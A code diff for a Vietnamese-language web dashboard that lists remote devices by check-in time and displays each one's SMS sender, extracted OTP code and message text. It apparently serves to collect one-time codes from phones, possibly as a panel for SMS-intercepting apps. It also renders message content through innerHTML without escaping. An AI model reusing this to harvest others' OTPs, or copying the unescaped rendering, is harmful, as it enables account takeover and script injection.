@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Device Manager</title>
+<title>SMS Device</title>
 
 <style>
 body {
@@ -24,7 +24,6 @@ body {
 .offline { border-left: 5px solid #ef4444; }
 
 .sms {
-  margin-left: 20px;
   margin-top: 10px;
   background: #020617;
   padding: 10px;
@@ -35,7 +34,7 @@ body {
 </head>
 <body>
 
-<h2>📱 Danh sách thiết bị</h2>
+<h2>📱 Thiết bị</h2>
 <div id="devices"></div>
 
 <script>
@@ -54,17 +53,16 @@ function load() {
   .then(res => res.json())
   .then(data => {
     allData = data;
-    renderDevices();
+    render();
   });
 }
 
-function renderDevices() {
+function render() {
   const container = document.getElementById("devices");
   container.innerHTML = "";
 
   const grouped = {};
 
-  // gom theo device
   allData.forEach(s => {
     if (!grouped[s.device]) grouped[s.device] = [];
     grouped[s.device].push(s);
@@ -76,48 +74,44 @@ function renderDevices() {
     const lastTime = new Date(list[0].created_at);
     const now = new Date();
 
-    const isOnline = (now - lastTime) < 120000; // 2 phút
+    const isOnline = (now - lastTime) < 120000;
 
     const div = document.createElement("div");
     div.className = "device " + (isOnline ? "online" : "offline");
 
     div.innerHTML = `
-      <b>${device}</b>
-      <br>
-      ${isOnline ? "🟢 Online" : "🔴 Offline"}
-      <br>
+      <b>${device}</b><br>
+      ${isOnline ? "🟢 Online" : "🔴 Offline"}<br>
       <button onclick="deleteDevice('${device}')">🗑 Xoá</button>
     `;
 
-    // click để mở SMS
-    div.onclick = () => showSMS(device);
+    div.onclick = () => showSMS(device, div);
 
     container.appendChild(div);
   });
 }
 
-function showSMS(device) {
+function showSMS(device, element) {
+
   const list = allData.filter(s => s.device === device);
 
   let html = "<div class='sms'>";
 
   list.forEach(s => {
     html += `
-      <div>
-        🔢 ${s.otp}<br>
-        📩 ${s.content}
-        <hr>
-      </div>
+      📨 ${s.sender}<br>
+      🔢 ${s.otp}<br>
+      📩 ${s.content}
+      <hr>
     `;
   });
 
   html += "</div>";
 
-  document.querySelectorAll(".sms").forEach(e => e.remove());
-  event.currentTarget.insertAdjacentHTML("beforeend", html);
+  element.querySelectorAll(".sms").forEach(e => e.remove());
+  element.insertAdjacentHTML("beforeend", html);
 }
 
-// xoá máy
 function deleteDevice(device) {
   event.stopPropagation();
 
@@ -127,17 +121,10 @@ function deleteDevice(device) {
       "apikey": KEY,
       "Authorization": "Bearer " + KEY
     }
-  })
-  .then(() => {
-    alert("Đã xoá máy!");
-    load();
-  });
+  }).then(() => load());
 }
 
-// load lần đầu
 load();
-
-// auto refresh
 setInterval(load, 3000);
 </script>
 
